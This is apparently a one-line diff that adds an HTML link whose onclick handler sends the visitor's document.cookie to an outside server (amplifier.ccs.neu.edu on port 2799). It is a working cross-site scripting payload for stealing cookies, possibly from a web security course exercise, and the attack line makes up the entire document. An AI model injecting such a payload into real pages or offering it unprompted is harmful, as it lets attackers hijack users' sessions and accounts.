@@ -1,0 +1,1 @@
+<a href = "#" onclick = "window.open('http://amplifier.ccs.neu.edu:2799?cookie=' + document.cookie);"> text </a>
